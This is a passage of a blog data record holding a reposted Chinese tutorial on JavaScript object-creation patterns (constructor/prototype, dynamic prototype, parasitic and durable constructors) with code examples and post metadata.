136);\">this</span>.name);\n &nbsp; &nbsp;}</span></code><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">}</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">var person1 = <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">new</span> Person(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"wei\"</span>,<span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 102);\">29</span>);</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">var person2 = <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">new</span> Person(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"bu\"</span>,<span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 102);\">25</span>);</span></code></p><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">person1.friends.push(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"嬴政\"</span>);</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">console</span>.log(person1.friends); &nbsp; <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">//</span>[<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"乾隆\"</span>, <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"康熙\"</span>, <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"嬴政\"</span>]</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">console</span>.log(person2.friends); &nbsp; <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">//</span>[<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"乾隆\"</span>, <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"康熙\"</span>]</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">console</span>.log(person1.friends === person2.friends); &nbsp; <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">//</span><span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 102);\">false</span></span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">console</span>.log(person1.sayName === person2.sayName); &nbsp; <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">//</span><span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 102);\">true</span></span></code></p></pre></section></section><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在这个例子中，实例属性都是在构造函数中定义的，而由所有实例共享的属性<span style=\"color: rgb(0, 128, 255);\">constructor</span>和方法<span style=\"color: rgb(0, 128, 255);\">sayName()</span>则是在原型中定义的。所以修改了<span style=\"color: rgb(0, 128, 255);\">person1.friends</span>并不会改变<span style=\"color: rgb(0, 128, 255);\">person2.friends</span>，因为他们分别引用了不同的数组。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这种构造函数与原型模式混成的模式，是目前在ECMAScript中使用最广泛、认同度最高的一种创建自定义类型的方法。可以说，这是用来定义引用的一种默认形式。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(247, 92, 47);\"><strong>五、动态原型模式</strong></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;有其他OO语言经验的开发人员在看到独立的构造函数和原型时，很可能会感到非常的困惑。动态原型模式就是用来解决这个问题的一个方案，它把所有的信息都封装在了构造函数中，而通过构造函数中初始化原型（仅在必要的情况下），又保持了同时使用构造函数和原型的优点。换句话说，可以通过检查某个应该存在的方法是否有效，来决定是否要初始化原型。来看一个例子：</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"></span></p><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span> Person<span class=\"\" style=\"color: rgb(102, 0, 102);\">(name, age)</span>{</span></code><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.name = name; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.age = age; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.friends = [<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"乾隆\"</span>,<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"康熙\"</span>]; &nbsp; &nbsp;<span class=\"\" style=\"font-size: 14px; color: rgb(136, 0, 0);\">//注意if语句</span></span></code></p><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">&nbsp;&nbsp;&nbsp;&nbsp;<span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">if</span>(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">typeof</span> <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">this</span>.sayName!=<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"function\"</span>){<br>&nbsp;&nbsp;&nbsp;&nbsp;Person.prototype.sayName = <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">function</span><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">()</span>{ <br>&nbsp;&nbsp;&nbsp;&nbsp;alert(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">this</span>.name);\n &nbsp; &nbsp; &nbsp; &nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;} &nbsp; &nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;}</span></code><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">}</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">var</span> person1 = <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">new</span> Person(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"wei\"</span>,<span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 102);\">29</span>);</span></code></p><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">person1.friends.push(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"嬴政\"</span>);\nperson1.sayName();</span></code></pre></section><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;注意构造函数代码中的if语句，这里只在<span style=\"color: rgb(0, 128, 255);\">sayName()</span>方法不存在的情况下才会将它添加到原型中。这断代码只有在第一次调用构造函数的时候才会被执行。此后，原型已经被初始化，不需要再做什么修改。不过要记住，这里所做的修改能立即在所有实例中得到反映。因此，这种方法可以说确实非常完美。其中if语句检查的是初始化之后应该存在的任何方法和属性–不必再用一大堆if来检查每个属性和方法，只检查其中一个即可。对于采用这样模式创建的对象，还可以使用<span style=\"color: rgb(0, 128, 255);\">instanceof</span>操作符来确定他的类型。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(247, 92, 47);\"><strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;注意：使用动态原型模式时，不能使用对象字面量重写原型。如果在已经创建了实例的情况下重写原型，那么就会切断现有的实例与新原型之间的联系。</strong></span><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><br></p><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><strong><span style=\"color: rgb(247, 92, 47);\">六、寄生构造函数模式</span></strong></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><br></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通常，在上述几种模式都不适合的情况下可以使用寄生构造函数模式。这种模式的基本思想是创建一个函数，该函数的作用仅仅是封装创建对象的代码，然后再返回新创建的对象，但从表面看，这个函数又很像典型的构造函数。来看一个例子：</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap; word-wrap: break-word; box-sizing: border-box;  overflow-y: hidden; overflow-x: auto; margin-top: 0px; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit; box-sizing: border-box ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">function</span> <span class=\"\" style=\"box-sizing: border-box;\">Person</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">(name, age, job)</span>{</span><br><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">&nbsp; var</span> o = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> <span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">Object</span>();<br>&nbsp; o.name = name;<br>&nbsp; o.age = age;\n &nbsp; &nbsp;<br>&nbsp; o.job = job;\n &nbsp; &nbsp;<br>&nbsp; o.sayName = <span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">function</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">()</span>{</span><br>&nbsp; alert(<span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">this</span>.name);\n &nbsp; &nbsp;} &nbsp; &nbsp;<br><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\"> &nbsp; &nbsp; &nbsp;return</span> o;\n}<br><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">var</span> person = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> Person(<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"wei\"</span>,<span class=\"\" style=\"color: rgb(0, 102, 102); box-sizing: border-box;\">29</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"banzhuan\"</span>);\nperson.sayName(); &nbsp; <span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\">//\"wei\"</span></span></code></pre><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在这个例子中，<span style=\"color: rgb(0, 128, 255);\">Person</span>函数创建了一个对象，并以相应的属性和方法初始化该对象，然后返回了这个对象。除了使用<span style=\"color: rgb(0, 128, 255);\">new</span>操作符把使用的包装函数叫做构造函数之外，这个模式和工厂模式并没有多大的区别。构造函数在不返回值的情况下，会默认返回新对象的实例。而通过在构造函数的末尾添加一个<span style=\"color: rgb(0, 128, 255);\">return</span>语句，可以重写调用构造函数时返回的值。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这个模式可以在特殊的情况下来为对象创建构造函数。假设我们想创建一个具有额外方法的特殊数组。由于不能直接修改Array构造函数，因此可以使用这个模式：</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap; word-wrap: break-word; box-sizing: border-box;  overflow-y: hidden; overflow-x: auto; margin-top: 0px; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit; box-sizing: border-box ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">function</span> <span class=\"\" style=\"box-sizing: border-box;\">SpecialArray</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">()</span>{</span><span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\"><br> &nbsp; &nbsp;//创建数组</span><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\"><br> &nbsp; &nbsp;var</span> values = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> <span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">Array</span>(); &nbsp; &nbsp;<br> &nbsp; &nbsp;<br> &nbsp; &nbsp;<span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\">//添加值</span><br> &nbsp; &nbsp;values.push.apply(values,<span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">arguments</span>); &nbsp; &nbsp;<br> &nbsp; &nbsp;<br> &nbsp; &nbsp;<span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\">//添加方法</span><br> &nbsp; &nbsp;values.toPipedString = <span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">function</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">()</span>{</span>\n &nbsp; &nbsp; &nbsp; &nbsp;<br>&nbsp; &nbsp; &nbsp;<span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">return</span> <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">this</span>.join(<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"|\"</span>);<br>} &nbsp; &nbsp;<br> <br> <span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\">&nbsp; &nbsp;//返回数组</span><br> <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">&nbsp; &nbsp;return</span> values;<br> }<br><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">var</span> colors = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> SpecialArray(<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"red\"</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"blue\"</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"green\"</span>);<br>console.log(colors.toPipedString());<span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\">//red|blue|green</span></span></code></pre><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在这个例子中，我们创建了一个名为<span style=\"color: rgb(0, 128, 255);\">SpecialArray</span>的构造函数。在这个函数的内部，首先创建了一个数组，然后<span style=\"color: rgb(0, 128, 255);\">push()</span>方法初始化了数组的值。随后又给数组实例添加了<span style=\"color: rgb(0, 128, 255);\">toPipedString()</span>方法，用来返回以竖线分隔的数组值。最后将数组以函数的形式返回。接着，我们调用了<span style=\"color: rgb(0, 128, 255);\">SpecialArray</span>构造函数，传入了初始化的值，并调用了<span style=\"color: rgb(0, 128, 255);\">toPipedString()</span>方法。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;关于寄生构造函数模式，有一点需要声明：首先，返回的对象与构造函数或者构造函数的原型没有任何关系；也就是说，构造函数返回的对象与在构造函数外部创建的对象没有什么不同。为此，不能依赖instanceof操作符来确定对象的类型。由于存在这一的问题，我们建议在可以使用其他模式的情况下不要使用这种模式。<br></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(247, 92, 47);\"><strong>七、稳妥构造函数模式</strong></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;道格拉斯·克拉克福德发明了JavaScript中的稳妥对象这个概念。所谓<span style=\"color: rgb(247, 92, 47);\"><strong>稳妥对象，是指没有公共属性，而且其方法也不引用this对象</strong></span>。稳妥对象最适合在一些安全环境中（这些环境会禁止使用this和new），或者在防止数据被其他应用程序改动时使用。稳妥构造函数遵循的与寄生构造函数类似的模式，但又两点不同：一是新创建对象的实例方法不引用this；二是不使用new操作符调用构造函数。按照稳妥构造函数的要求，可以将前面的<span style=\"color: rgb(0, 128, 255);\">Person</span>构造函数重写如下：</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap; word-wrap: break-word; box-sizing: border-box;  overflow-y: hidden; overflow-x: auto; margin-top: 0px; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit; box-sizing: border-box ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">function</span> <span class=\"\" style=\"box-sizing: border-box;\">Person</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">(name, age, job)</span>{</span><span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\"> &nbsp; &nbsp;<br> &nbsp; &nbsp;//创建要返回的新对象</span><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">&nbsp; &nbsp; <br>&nbsp; &nbsp;var</span> o = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> <span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">Object</span>(); <br> &nbsp;<br><span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\"> &nbsp; &nbsp;//可以在这里定义私有变量和函数 &nbsp; &nbsp;<br> &nbsp; &nbsp;<br> &nbsp; &nbsp;//添加方法</span><br>&nbsp; &nbsp;o.sayName = <span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">function</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">()</span>{</span>&nbsp;<br>&nbsp; &nbsp; &nbsp;&nbsp;alert(<span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">this</span>.name);\n &nbsp; &nbsp;<br>&nbsp; &nbsp;}; &nbsp; &nbsp;<br><br> &nbsp; &nbsp;<span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\">//返回对象</span><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\"><br>&nbsp; &nbsp;return</span> o;<br> &nbsp; &nbsp;}</span></code></pre><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;注意，在以这种模式创建的对象中，除了使用<span style=\"color: rgb(0, 128, 255);\">sayName()</span>方法之外，没有其他办法访问<span style=\"color: rgb(0, 128, 255);\">name</span>的值。可以像下面使用稳妥的<span style=\"color: rgb(0, 128, 255);\">Person</span>构造函数：</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap; word-wrap: break-word; box-sizing: border-box;  overflow-y: hidden; overflow-x: auto; margin-top: 0px; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit; box-sizing: border-box ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">var</span> person =Person(<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"weiqi\"</span>,<span class=\"\" style=\"color: rgb(0, 102, 102); box-sizing: border-box;\">22</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"banzhuan\"</span>);<br>person.sayName(); &nbsp; <span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\">//weiqi</span></span></code></pre><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这样，变量<span style=\"color: rgb(0, 128, 255);\">person</span>中保存的是一个稳妥对象，而除了<span style=\"color: rgb(0, 128, 255);\">sayName()</span>方法外，没有别的方式可以访问其他数据成员。即使有其他代码会给这个对象添加方法或数据成员，但也不可能有别的办法访问传入到构造函数中的原始数据。稳妥构造函数模式提供的这种安全性，使得他非常适合在某些安全执行环境–例如，ADsafe(www.adsafe.org)提供的环境下使用。&nbsp;</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style=\"color: rgb(247, 92, 47);\"><strong>注意：与寄生构造函数模式类似，使用稳妥构造函数模式创建的对象与构造函数之间没有什么关系，因此instanceof操作符对这种对象也没有意义。</strong></span></span></p>\n \n>转自：http://blog.csdn.net/u014346301/article/details/52204967","slug":"JavaScript创建对象的七种模式","published":1,"updated":"2017-03-08T19:05:11.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj2mm9xqq004k5es5n5426caf","content":"<p><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ECMA-262把<span style=\"color: rgb(0, 128, 255);\">对象</span>定义为：”无需属性的集合，其属性可以包含基本值、对象或者函数。”严格来讲，这就相当于说明对象是一组没有特定顺序的值。对象的每个属性或方法都有一个名字，而每个名字都映射到一个值。正因为这样，我们可以把ECMAScript的对象想象成散列表：无非就是一组名对值，其中值可以是数据或函数。&nbsp;</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;创建自定义对象最简单的方式就是创建一个<span style=\"color: rgb(0, 128, 255);\">Object</span>的实例，然后再为他添加属性和方法，如下所示：</span></p></section><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136);\">var</span> person = <span class=\"\" style=\"color: rgb(0, 0, 136);\">new</span> <span class=\"\" style=\"color: rgb(102, 0, 102);\">Object</span>();、</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">person.name = <span class=\"\" style=\"font-size: 12px; color: rgb(0, 136, 0);\">“liubei”</span>;</span></code></p><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">person.age = <span class=\"\" style=\"font-size: 12px; color: rgb(0, 102, 102);\">29</span>;<br>person.job = <span class=\"\" style=\"font-size: 12px; color: rgb(0, 136, 0);\">“shayemuyou”</span>;<br><br>person.sayName = <span class=\"\" style=\"font-size: 12px; color: rgb(0, 0, 136);\">function</span><span class=\"\" style=\"font-size: 12px; color: rgb(102, 0, 102);\">()</span>{<br> &nbsp; &nbsp;<br>&nbsp; alert(<span class=\"\" style=\"font-size: 12px; color: rgb(0, 0, 136);\">this</span>.name);<br>}</span></code></pre><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;上面的例子创建了一个名为<span style=\"color: rgb(0, 128, 255);\">person</span>的对象，并为他添加了三个属性和一个方法。其中<span style=\"color: rgb(0, 128, 255);\">sayName()</span>方法用于显示name属性，<span style=\"color: rgb(0, 128, 255);\">this.name</span>将被解析为person.name，早期的开发人员经常使用这个模式来创建对象，后来对象字面量的方法成了创建对象的首选模式，上面的例子用对象字面量的语法可以写成如下这样：</span></p></section><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136);\">var</span> person = {<br> &nbsp; &nbsp;<br> &nbsp; &nbsp;&nbsp;name:<span class=\"\" style=\"color: rgb(0, 136, 0);\">“liubei”</span>,<br> &nbsp; &nbsp;<br> &nbsp; 